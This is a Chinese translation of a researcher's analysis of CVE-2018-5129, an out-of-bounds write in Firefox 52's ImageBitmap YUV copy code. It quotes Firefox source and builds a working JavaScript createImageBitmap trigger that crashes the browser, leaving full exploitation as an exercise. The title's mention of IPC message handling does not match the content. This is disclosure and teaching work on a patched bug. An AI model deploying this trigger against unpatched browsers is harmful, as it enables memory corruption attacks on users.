@@ -1,0 +1,665 @@
+# Firefox IPC消息处理越界写漏洞（CVE-2018-5129）分析
+
+阅读量 **201301**
+
+|评论 **2**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-09-19 11:30:54
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 loopsec，文章来源：infinite.loopsec.com.au
+
+原文地址：<https://infinite.loopsec.com.au/cve-2018-5129-how-i-found-my-first-cve>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/dm/1024_563_/t01ceb5865ec946295a.png)
+
+## 一、概述
+
+本文主要对我在去年年底发现的Firefox漏洞进行分析。在深入到细节之前，首先要聊聊在我开发漏洞利用程序过程中的体会，以及在过去几个月中发生的事情。
+
+从去年11月开始，我决定想要做一些更加“现实”的漏洞利用。我希望选择一个在调试和漏洞利用方面都实际可行的目标，并且相关的学习资料最好能易于获得。基于此，我挑选了一个浏览器，也就是Firefox进行漏洞研究。不止是因为这款浏览器在开发和维护过程中都有大量的文档可做参考，还因为这是一个完全开源的软件，此前也有一些漏洞利用的研究成果，并且看起来非常有趣！
+
+我认真分析了Firefox此前被发现的所有漏洞，并选择了其中一个比较有趣的CVE-2017-5428。这个漏洞的有趣之处在于，它曾经在Pwn2Own
+2017中被使用过，而且这一漏洞可以通过JavaScript进行利用。既然如此，我的目标就是弹出calc.exe（针对Windows）或calc.app（针对macOS）。
+
+在度过了几个不眠之夜，尝试对CVE-2017-5428进行漏洞利用之后，我开始意识到，我实际上已经针对一个完全不同的漏洞实现了漏洞利用。大家可能想问，你是怎么根据原有漏洞发现另一个漏洞的？其实，这个新漏洞其实是我在尝试进行原有漏洞利用过程中无意发现的，我甚至一开始没有意识到它本身就是一个漏洞。事实证明，这是一次非常有趣的体验。
+
+## 二、漏洞概览
+
+###  2.1 CVE-2017-5428（Pwn2Own）
+
+2017年3月17日，Firefox发布了一份报告（ <https://www.mozilla.org/en-US/security/advisories/mfsa2017-08/>
+），详细说明了Chaitin安全研究实验室发现的一个漏洞（CVE-2017-5428），该漏洞影响52.0.1版本以下的火狐浏览器。由于Pwn2Own
+2017上的演示（ <https://www.thezdi.com/blog/2017/3/15/pwn2own-2017-day-two-schedule-and-results> ），趋势科技的Zero Day
+Initiative随即报告了这一漏洞。该漏洞的Firefox参考（Bug#1348168，
+<https://bugzilla.mozilla.org/show_bug.cgi?id=1348168>
+）中包含了有关漏洞利用、漏洞分析和缓解方案的内部讨论。
+
+CVE-2017-5428是由于createImageBitmap()函数中存在整型溢出漏洞。具体来说，ImageBitmap对象接受ArrayBuffer或ArrayBufferView作为参数的构造函数发生了重载。
+
+###  2.2 CVE-2018-5129
+
+2018年3月13日，Firefox发布了一份咨询报告（ <https://www.mozilla.org/en-US/security/advisories/mfsa2018-06/#CVE-2018-5129>
+），披露了我在CVE-2017-5428漏洞利用过程中发现的新漏洞。该漏洞可以在52.0.1版本以下的Firefox中从非特权JavaScript中触发。但在较新版本的Firefox中，需要使用一些加密视频文件元数据来制作触发器，这一过程比较棘手。
+
+本文将重点介绍CVE-2018-5129的技术细节以及触发器的制作过程。
+
+## 三、理解漏洞：一些重要的对象
+
+在我们进入到对漏洞的技术分析之前，我认为首先了解一些重要对象的用途，并弄清它们在浏览器中的工作方式，这一点是至关重要的。
+
+###  3.1 ImageBitmap
+
+第一个重要的对象是ImageBitmap对象，这一对象是用于存储位图图像的接口，可以绘制到<canvas>元素上，并且不会有任何明显的渲染时间。有很多方法可以使用createImageBitmap()工厂方法模式（Factory
+Method）创建对象，但由于CVE-2017-5428漏洞的存在，一些重载的构造函数已经失效。ImageBitmap对象还提供了一种异步的、资源友好的方式，准备用于在WebGL中呈现的纹理。
+
+该对象具有两个属性：width和height，同时只有一个方法close()，该方法负责处理与ImageBitmap对象关联的所有图形资源。
+
+###  3.2 ImageBitmapFormat
+
+ImageBitmapFormat是一个包含许多成员的枚举类。枚举成员表示ImageBitmap对象可以采用多种不同的uint32_t内部格式。这些不同的格式，在枚举类中定义如下：
+
+    
+    
+    enum class ImageBitmapFormat : uint32_t {
+      RGBA32,
+      BGRA32,
+      RGB24,
+      BGR24,
+      GRAY8,
+      YUV444P,
+      YUV422P,
+      YUV420P,
+      YUV420SP_NV12,
+      YUV420SP_NV21,
+      HSV,
+      Lab,
+      DEPTH,
+      EndGuard_
+    };
+    
+
+###  3.3 RecyclingPlanarYCbCrImage & PlanarYCbCrImage
+
+RecyclingPlanarYCbCrImage和PlanarYCbCrImage表示原始图像数据。
+
+PlanarYCbCrImage和Recycling对象之间的区别在于，Recycling对象使用内部缓冲区分配机制。它有一个简单的Array，用于存储当前分配或释放的每个缓冲区。这样以来，初始化和分配的新对象将从空闲缓冲区数组中得到缓冲区，从而实现对旧内存的回收，而不是继续请求更多内存空间。
+
+## 四、漏洞详情
+
+首先，我们来看看脱离上下文环境的漏洞。所谓脱离上下文环境，就是我们首先了解存在漏洞的函数和类，但暂时不关注如何从JavaScript实现对漏洞的利用。我们将在下一章中对代码库进行跟踪，并开发JavaScript触发器。
+
+###  4.1 函数#1 – RecyclingPlanarYCbCrImage::CopyPlane
+
+第一个相关的函数是下面展示的CopyPlane函数。这一函数名称直接说明了它的功能——将aSrc缓冲区复制到aDst缓冲区中。但是，该函数会根据aSkip参数的不同，执行以下两种复制类型中的一种：
+
+如果aSkip == 0，将采用“快速路径（Fast
+Path）”。这一路径使用memcpy函数将aSrc缓冲区复制到aDst缓冲区中。大小计算基于aSize.height *
+aStride的结果，它们都是由调用函数提供的。
+
+如果aSkip != 0，将采用“慢速路径（Slow Path）”。这一路径使用嵌套的for循环对aSrc和aDst缓冲区进行循环，每次循环复制一个字节。
+
+    
+    
+    CopyPlane(uint8_t *aDst, const uint8_t *aSrc, const gfx::IntSize &aSize, int32_t aStride, int32_t aSkip)
+    {
+    
+      if (!aSkip) { /* 1 */
+        // Fast path: planar input.
+        memcpy(aDst, aSrc, aSize.height * aStride);
+    
+      } else { /* 2 */
+        int32_t height = aSize.height;
+        int32_t width = aSize.width; 
+        for (int y = 0; y < height; ++y) {
+          const uint8_t *src = aSrc;
+          uint8_t *dst = aDst;
+          // Slow path
+          for (int x = 0; x < width; ++x) {
+            *dst++ = *src++;
+            src += aSkip; /* Nuance 1 */
+          }
+          /* Nuance 2 */
+          aSrc += aStride; 
+          aDst += aStride;
+        }
+      }
+    }
+    
+
+CopyPlane提供的功能并不是始终不变的，通常DOM和JavaScript引擎会提供经优化后的“Fast”路径和一个较慢的“Slow”路径，以便在满足特定条件的情况下提高处理速度。在这种情况下，我们还需要了解二者的一些细微差别。
+
+如果在“Slow Path”中使用aSkip参数，就意味着如果aSkip =
+1（或任何非0数值），那么内层x循环内的每次循环都将跳过aSrc缓冲区的1个字节。这一点非常重要，需要在后续利用。
+
+在内层x循环完成后，每次循环都会使用aStride参数。同样，如果aStride =
+1，那么外层y循环的每次迭代都将跳过aSrc和aDst缓冲区的1个字节。
+
+现在，我们对于CopyPlane函数的运行方式有了一定了解，接下来让我们来看看调用函数。
+
+###  4.2 函数#2 – RecyclingPlanarYCbCrImage::CopyData
+
+在这种情况下，我们调用的函数是CopyData，该函数只有一个参数aData。CopyData充当CopyPlane函数的包装器，用于计算大小、分配目标缓冲区，并通过3次调用CopyPlane，在3个独立的通道上执行复制操作。为简单起见，我们只展示了与漏洞相关的代码部分。
+
+    
+    
+    RecyclingPlanarYCbCrImage::CopyData(const Data& aData){
+      mData = aData;
+    
+      /* 1 */
+      // update buffer size
+      size_t size = mData.mCbCrStride * mData.mCbCrSize.height * 2 + mData.mYStride * mData.mYSize.height;
+    
+      /* 2 */
+      // get new buffer
+      mBuffer = AllocateBuffer(size);
+    
+      /* 3 */
+      if (!mBuffer)
+        return false;
+    
+      // update buffer size
+      mBufferSize = size;
+    
+      mData.mYChannel = mBuffer.get();
+      mData.mCbChannel = mData.mYChannel + mData.mYStride * mData.mYSize.height;
+      mData.mCrChannel = mData.mCbChannel + mData.mCbCrStride * mData.mCbCrSize.height;
+    
+      /* 4 */
+      CopyPlane(mData.mYChannel, aData.mYChannel, mData.mYSize, mData.mYStride, mData.mYSkip);
+      CopyPlane(mData.mCbChannel, aData.mCbChannel, mData.mCbCrSize, mData.mCbCrStride, mData.mCbSkip);
+      CopyPlane(mData.mCrChannel, aData.mCrChannel, mData.mCbCrSize, mData.mCbCrStride, mData.mCrSkip);
+    
+     ...
+      }
+    
+
+最初，在跟踪CVE-2017-5428的代码时，整型溢出体现得非常明显。变量size被定义为size_t（默认情况下为无符号整数），在64位系统上存储为最大的ULONG_MAX类型，在32位系统上存储为UINT_MAX。Firefox默认为64位，因此需要一些计算，来精确算出其每个组件的大小，以便让我们能够控制溢出。但是，经计算，我们可以轻松地对大小变量进行溢出。然后，得到的整数值可以用于缓冲区分配。这一整型溢出是Chaitin安全研究实验室在Pwn2Own上展示的基础，但我还是建议各位读者阅读该团队的漏洞报告并对其尝试利用。
+
+在计算大小之后，我们从RecycleBin中分配一个缓冲区。这样就意味着，我们的缓冲区将被RecyclingPlanarYcbCrImage对象中这个实例分配的预先存在的缓冲区列表所使用。
+
+在有了缓冲区之后，就会继续为每个通道计算适当的偏移量。每一个通道代表不同的色彩空间，共同作为YCbCr色彩空间系列的一部分。最后，使用相关参数调用我们的CopyPlane函数。
+
+需要注意的一件事是，这个函数是mData成员。在第二行，mData被设置为等于aData参数，这就意味着在我们的3个CopyPlane调用中，包含aData参数的任何内容都不会被CopyData函数所修改。反过来，任何未被修改的mData成员都与aData成员相同（例如每个通道成员变量）。
+
+###  4.3 越界访问写入
+
+作为漏洞利用开发过程的一部分，我对两个函数执行了相同级别的分析，并确定了其中的关键点。就是在这个过程中，我发现了CVE-2018-5129的存在，但直到我通过触发器成功实现堆喷射（Heap-spray）和信息泄露，我才意识到这是一个新的漏洞。
+
+此漏洞的第一部分，是计算CopyData函数中的size变量。这一计算过程会用到mData的以下成员：
+
+    
+    
+    mData.mCbCrStride <--- CbCr Stride
+    mData.mCbCrSize.height <--- CbCr Height
+    mData.mYStride <--- Y Stride
+    mData.mYSize.height <--- Y Height
+    
+
+计算过程会使用两个单独的“Channel”对象的跨度（Stride）和高度（Height）来计算总缓冲区大小，因此要分别计算mYChannel、mCbChannel和mCrChannel每个目标mBuffer的大小。
+
+起初，我认为这个计算过程除了已被发现的整型溢出漏洞之外没有问题。但直到我仔细研究了CopyPlane函数的慢速路径，我才注意到这个微妙的问题。
+
+    
+    
+        int32_t height = aSize.height;
+        int32_t width = aSize.width; 
+        for (int y = 0; y < height; ++y) {
+          const uint8_t *src = aSrc;
+          uint8_t *dst = aDst;
+          // Slow path
+          for (int x = 0; x < width; ++x) { <----- HERE!!
+            *dst++ = *src++;
+            src += aSkip;
+          }
+          /* b */
+          aSrc += aStride; 
+          aDst += aStride;
+    }
+    
+
+上述代码片段是CopyPlane函数的“慢速路径”。如前所述，它使用“Slow”嵌套for循环，对aSrc和aDst缓冲区进行循环，并逐字节复制图像数据。然而，内层循环中的宽度（Width）存在漏洞，内层循环使用width属性来计算x轴。这就是漏洞的第二部分。
+
+这里的问题在于，CopyData中mBuffer变量的大小计算和后续分配，都不会再使用width变量。它会根据高度和跨度计算目标缓冲区的大小，与宽度无关。然后，我们的CopyPlane函数会迭代aSrc和aDst的高度和宽度。
+
+所以回顾一下，我们有以下两个条件：
+
+1、基于高度*跨度计算尺寸；
+
+2、嵌套的for循环，其中内层for循环遍历缓冲区的宽度，而这个宽度是在第一步中未考虑过的变量。
+
+因此，我迅速编写了一个触发器，用了大概几小时的时间。之后，我便可以通过越界访问写入漏洞，成功使得52版本的Firefox崩溃。
+
+## 五、制作触发器
+
+目前，我们已经掌握了漏洞，接下来需要证明该漏洞确实影响浏览器。在本章中，我将确定受漏洞影响代码的最简单路径，并通过JavaScript触发器来实现每一个步骤。  
+在探索了许多潜在的代码路径之后，我们发现针对52版本的Firefox，最简单的方法就是通过公开的CreateImageBitmap()函数。我们要想成功运行calc.exe，大概需要如下几个步骤：
+
+1、createImageBitmap()
+
+2、ImageBitmap::Create
+
+3、ImageBitmap::CreateImageFromBufferSourceRawData
+
+4、CopyData
+
+5、CopyPlane
+
+###  5.1入口点
+
+createImageBitmap函数是一个可以从Web Worker或主线程调用的工厂方法，它有很多重载，但我们感兴趣的是这一个：
+
+    
+    
+    createImageBitmap(buffer, offset, length, 'FORMAT', [layout1, layout2, layout3]);
+    
+
+这就是我们的入口点。从这里开始，我们可以研究引擎的更深层次。
+
+###  5.2 ImageBitmap构造函数
+
+ImageBitmap对象的构造函数与JavaScript的入口点非常相似。它使用缓冲区、偏移量、长度、格式和布局，负责初始化和创建ImageBitmap对象。
+
+    
+    
+    /*static*/ already_AddRefed
+    ImageBitmap::Create(nsIGlobalObject* aGlobal, 
+                        const ImageBitmapSource& aBuffer, /* 1 */
+                        int32_t aOffset, /* 2 */
+                        int32_t aLength, /* 3 */
+                        mozilla::dom::ImageBitmapFormat aFormat, /* 4 */
+                        const Sequence& aLayout, /* 5 */
+                        ErrorResult& aRv)
+    
+
+aBuffer：表示我们将从中创建ImageBitmap的ArrayBuffer或ArrayBufferView。
+
+aOffset：一个有符号32位整数，表示aBuffer中的偏移量，用于从中提取ImageBitmap数据。
+
+aLength：一个有符号32位整数，表示对象的长度。
+
+aFormat：表示创建ImageBitmap时aBuffer的格式。
+
+aLayout：ImageBitmap的布局对象数组。
+
+下面是构造函数相关的代码：
+
+    
+    
+    ... 
+      uint8_t* bufferData = nullptr;
+      uint32_t bufferLength = 0;
+    
+      /* 1 */
+      if (aBuffer.IsArrayBuffer()) {
+        const ArrayBuffer& buffer = aBuffer.GetAsArrayBuffer();
+        buffer.ComputeLengthAndData();
+        bufferData = buffer.Data();
+        bufferLength = buffer.Length();
+      } else if (aBuffer.IsArrayBufferView()) {
+        const ArrayBufferView& bufferView = aBuffer.GetAsArrayBufferView();
+        bufferView.ComputeLengthAndData();
+        bufferData = bufferView.Data();
+        bufferLength = bufferView.Length();
+      } else {
+        aRv.Throw(NS_ERROR_NOT_IMPLEMENTED);
+        return promise.forget();
+      }
+    
+      ...
+      /* 2 */
+      // Check the buffer.
+      if (((uint32_t)(aOffset + aLength) > bufferLength)) {
+        aRv.Throw(NS_ERROR_DOM_INDEX_SIZE_ERR);
+        return promise.forget();
+      }
+    
+      // Create and Crop the raw data into a layers::Image
+      RefPtr data;
+      /* 3 */
+      if (NS_IsMainThread()) {
+        data = CreateImageFromBufferSourceRawData(bufferData + aOffset, bufferLength,
+                                                  aFormat, aLayout);
+      } else {
+        ...
+      }
+     ...
+    }
+    
+
+在构造函数中，我们需要理解3个重要的地方：
+
+1、确保aBuffer或我们的aSrc是ArrayBuffer或ArrayBufferView。
+
+2、该检查确保我们提供的aOffset和aLength小于第一部分中计算的bufferLength。
+
+3、最后，需进行检查，以确保在主线程上执行。如果我们决定从Web-worker创建ImageBitmap对象，那么这一if语句的值将为False，而else语句中将负责求值。因此，if(NS_IsMainThread())的计算结果必须要为True，因为我们下一阶段必须要用到CreateImageFromBufferSourceRawData函数。
+
+此时，我们构造的触发器可能如下所示：
+
+    
+    
+    try{
+    
+      var aBuffer = new Uint8Array(0x100000);
+      var aOffset = 0;
+      var aLength = 0x1000;
+    
+      bitmap = createImageBitmap(aBuffer, aOffset, aLength, 'FORMAT', [...]);
+    
+    } catch (ex) {
+      console.log(ex);
+    }
+    
+
+###  5.3 CreateImageFromBufferSourceRawData
+
+由于涉及到包含了许多不同图像格式的大型switch语句，因此这个函数需要花费一定时间来进行研究。最终我们发现，该函数接受aBufferData、aBufferLength、aFormat和aLayout参数。通过对这些参数进行操纵，就可以调用存在漏洞的CopyData函数。
+
+    
+    
+        CreateImageFromBufferSourceRawData(const uint8_t *aBufferData, /* 1 */
+                                       uint32_t aBufferLength, /* 2 */
+                                       mozilla::dom::ImageBitmapFormat aFormat, /* 3 */
+                                       const Sequence& aLayout)/* 4 */
+    
+
+const uint8_t *aBufferData：如ImageBitmap :: Create方法中的bufferData +
+aOffset所描述，指向我们的aBufferData的指针。
+
+uint32_t aBufferLength – 已经过验证并传入的无符号32位整数。
+
+mozilla::dom::ImageBitmapFormat
+aFormat：直接从ImageBitmap::Create方法传递的ImageBitmapFormat对象。
+
+const Sequence<ChannelPixelLayout>&
+aLayout：直接从ImageBitmap::Create方法传递的布局对象的地址。
+
+CreateImageFromBufferSourceRawData方法用于从缓冲区创建图像。生成的ImageBitmap所采用的格式，取决于aFormat参数。这一aFormat参数会传递给switch语句，然后用于选择生成的ImageBitmap格式。这个对象可以采用许多不同的格式，但在Firefox
+52.0发布时，只有两个条件（Case）可以实现：case ImageBitmapFormat::DEPTH:和case
+ImageBitmapFormat::YUV420SP_NV21:。
+
+我们感兴趣的是后者这种条件。
+
+    
+    
+      case ImageBitmapFormat::RGBA32:
+      case ImageBitmapFormat::BGRA32:
+      case ImageBitmapFormat::RGB24:
+      case ImageBitmapFormat::BGR24:
+      case ImageBitmapFormat::GRAY8:
+      case ImageBitmapFormat::HSV:
+      case ImageBitmapFormat::Lab:
+      case ImageBitmapFormat::DEPTH:
+      {
+        ...
+      }
+      case ImageBitmapFormat::YUV444P:
+      case ImageBitmapFormat::YUV422P:
+      case ImageBitmapFormat::YUV420P:
+      case ImageBitmapFormat::YUV420SP_NV12:
+      case ImageBitmapFormat::YUV420SP_NV21:
+      {
+          TARGET
+      }
+    
+
+我们的目标格式YUV420SP_NV21，是一种特定的颜色编码格式，被称为YUV。该格式通常作为彩色图像通道的一部分。我们在调用createImageBitmap时，只需要让aFormat参数的值为字符串“YUV420P”即可进入到这种条件（Case）。
+
+YUV420SP_NV21条件体的内容如下所示：
+
+    
+    
+    ...
+        // Prepare the PlanarYCbCrData.
+        /* 1 */
+        const ChannelPixelLayout& yLayout = aLayout[0];
+        const ChannelPixelLayout& uLayout = aFormat != ImageBitmapFormat::YUV420SP_NV21 ? aLayout[1] : aLayout[2];
+        const ChannelPixelLayout& vLayout = aFormat != ImageBitmapFormat::YUV420SP_NV21 ? aLayout[2] : aLayout[1];
+    
+        layers::PlanarYCbCrData data;
+    
+        // Luminance buffer
+        data.mYChannel = const_cast<uint8_t*>(aBufferData + yLayout.mOffset);
+        data.mYStride = yLayout.mStride;
+        data.mYSize = gfx::IntSize(yLayout.mWidth, yLayout.mHeight);
+        data.mYSkip = yLayout.mSkip;
+    
+        // Chroma buffers
+        data.mCbChannel = const_cast<uint8_t*>(aBufferData + uLayout.mOffset);
+        data.mCrChannel = const_cast<uint8_t*>(aBufferData + vLayout.mOffset);
+        data.mCbCrStride = uLayout.mStride;
+        data.mCbCrSize = gfx::IntSize(uLayout.mWidth, uLayout.mHeight);
+        data.mCbSkip = uLayout.mSkip;
+        data.mCrSkip = vLayout.mSkip;
+    
+        // Picture rectangle.
+        // We set the picture rectangle to exactly the size of the source image to
+        // keep the full original data.
+        data.mPicX = 0;
+        data.mPicY = 0;
+        data.mPicSize = data.mYSize;
+    
+        /* 2 */
+        // Create a layers::Image and set data.
+        if (aFormat == ImageBitmapFormat::YUV444P ||
+            aFormat == ImageBitmapFormat::YUV422P ||
+            aFormat == ImageBitmapFormat::YUV420P) {
+    
+          /* 3 */    
+          RefPtr image = new layers::RecyclingPlanarYCbCrImage(new layers::BufferRecycleBin());
+    
+          ...
+    
+          /* 4 */
+          // Set Data.
+          if (NS_WARN_IF(!image->CopyData(data))) {
+            return nullptr;
+          }
+    
+          return image.forget();
+        } else {
+          ...
+      }
+    
+
+正如我们所看到的，目前已经能够理清一些头绪了。
+
+1、在这里，有几行代码用于将布局对象的数量提供给createImageBitmap函数。两个内联的布尔表达式根据aFormat参数来确定布局的顺序。我们现在需要3个布局对象：yLayout、uLayout和vLayout。需要注意一点，在第一步完成后，我们的aBufferData和布局对象上有许多操作，这些操作将我们的数据对象设置为从3个布局对象传递给CopyData。
+
+2、这次检查只是为了确保我们提供了YUV420P格式。
+
+3、创建图像对象，我们的数据将被复制到该对象。这一对象是RecyclingPlanarYCbCrImage，存储在父类型PlanarYCbCrImage的RefPtr中。需要注意的是，每一个RecyclingPlanarYCbCrImage都要使用新的BufferRecyleBin对象进行初始化。
+
+4、最后，CopyData函数被恶意数据对象调用。
+
+现在，触发器如下所示：
+
+    
+    
+    try{
+      //Represents the Cr.. elements
+                    vLayout = {
+                        offset: 0,
+                        width: 4,
+                        height: 1,
+                        dataType: 'uint8',
+                        stride: 1,
+                        skip: 0,
+                    };
+      //represents our Y elements
+                    yLayout = {
+                            offset: 0,
+                            //mData.mYSize:
+                            width: 4, //mData.mYSize.width
+                            height: 4, //mData.mYSize.height
+                            dataType: 'uint8',
+                            stride: 1, //mData.mYStride
+                            skip: 1,
+                        };
+     //Represents the Cb.. elements
+                    uLayout = {
+                            offset: 0,
+                            //mData.mCbCrSize:
+                            width: 0, //mData.mCbCrSize.width
+                            height: 1,  //mData.mCbCrSize.height
+                            dataType: 'uint8',
+                            stride: 4, //mData.mCbCrStride
+                            skip: 1, 
+                        };
+    
+      var aBuffer = new Uint8Array(0x100000);
+      var aOffset = 0;
+      var aLength = 0x1000;
+    
+      bitmap = createImageBitmap(aBuffer, aOffset, aLength, 'YUV420P', [yLayout, uLayout, vLayout]);
+    
+    } catch (ex) {
+      console.log(ex);
+    }
+    
+
+在代码中，我已经写了一些注释，来描述哪些JavaScript布局对象与CreateImageFromBufferSourceRawData中的变量相关。
+这使得我们更容易确定我们控制的CopyData函数的哪些部分。
+
+###  5.4 CopyData和CopyPlane
+
+我们现在回到易受攻击的代码中。如前所述，这两个函数中存在2个漏洞：
+
+1、基于高度和跨度来计算大小。
+
+2、嵌套的for循环，其中内层for循环遍历了缓冲区的宽度，这是在第一步中没有考虑过的变量。
+
+我们需要进行的最后一步，是制作我们的布局对象，以便溢出aDst缓冲区。这里，需要用到一点数学知识。
+
+如果aDst缓冲区是根据以下公式计算的：
+
+    
+    
+    size_t size = mData.mCbCrStride * mData.mCbCrSize.height * 2 + mData.mYStride * mData.mYSize.height;
+    
+
+并且，我们控制该公式中的4个部分，因此我们可以控制分配的aDst缓冲区的大小。
+
+例如：
+
+    
+    
+    mData.mCbCrStride = 1
+    mData.mCbCrSize.height = 1
+    mData.mYStride = 1
+    mData.mYSize.height = 1024
+    size_t size = mData.mCbCrStride * mData.mCbCrSize.height * 2 + mData.mYStride * mData.mYSize.height;
+    size == 1026 bytes
+    
+
+因此，如果我们的aDst缓冲区长度为1026字节，我们所需要的只是让宽度>1026，就可以触发越界访问漏洞。
+
+###  5.5 完成的触发器
+
+现在，我们只需要将相关值，放入触发器中的JavaScript布局对象中：
+
+    
+    
+    try{
+      //Represents the Cr.. elements
+                    vLayout = {
+                        offset: 0,
+                        width: 4,
+                        height: 1,
+                        dataType: 'uint8',
+                        stride: 1,
+                        skip: 0,
+                    };
+      //represents our Y elements
+                    yLayout = {
+                            offset: 0,
+                            //mData.mYSize:
+                            width: 1, //mData.mYSize.width
+                            height: 1024, //mData.mYSize.height
+                            dataType: 'uint8',
+                            stride: 1, //mData.mYStride
+                            skip: 1,
+                        };
+     //Represents the Cb.. elements
+                    uLayout = {
+                            offset: 0,
+                            //mData.mCbCrSize:
+                            width: 2048, //mData.mCbCrSize.width
+                            height: 1,  //mData.mCbCrSize.height
+                            dataType: 'uint8',
+                            stride: 1, //mData.mCbCrStride
+                            skip: 1, 
+                        };
+    
+      var aBuffer = new Uint8Array(0x100000);
+      var aOffset = 0;
+      var aLength = 0x1000;
+    
+      bitmap = createImageBitmap(aBuffer, aOffset, aLength, 'YUV420P', [yLayout, uLayout, vLayout]);
+    
+    } catch (ex) {
+      console.log(ex);
+    }
+    
+
+并将其放入一些<script></script>标签中，那么就大功告成了！
+
+## 六、总结
+
+至此，我们已经对漏洞进行了深入分析，并编写了触发器。接下来就是弹出calc计算器了，而我将这个步骤作为练习，留给各位读者尝试。这个过程确实充满挑战，但也会有成功后的快感。
+
+从决定进行一些现实世界的攻击，到发现我的第一个漏洞，再到编写触发器，以及制作EXP，最后到Firefox修复这一漏洞，整个过程的体验可以说非常棒。从技术角度来说，Firefox是一头复杂的野兽，如果任何读者想要深入了解浏览器的工作原理，我觉得Firefox是不二之选。
+
+如果对本文有任何意见或建议，请随时在Twitter上联系我，[@0x4a47](https://github.com/0x4a47 "@0x4a47")。
+
+## 七、时间线
+
+2018年1月8日 报告漏洞
+
+2018年2月11日 漏洞已修复
+
+2018年3月13日 Firefox在FF59安全通告中发布了该漏洞
+
+2018年7月30日 Firefox公开漏洞详情
+
+本文翻译自infinite.loopsec.com.au
+[原文链接](https://infinite.loopsec.com.au/cve-2018-5129-how-i-found-my-first-cve)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **P!chu** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/160115](/post/id/160115)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[infinite.loopsec.com.au](https://infinite.loopsec.com.au/cve-2018-5129-how-i-found-my-first-cve)
+
+如若转载,请注明出处： <https://infinite.loopsec.com.au/cve-2018-5129-how-i-found-my-first-cve>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CVE](/tag/CVE)
+  * [firefox](/tag/firefox)
+  * [IPC](/tag/IPC)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
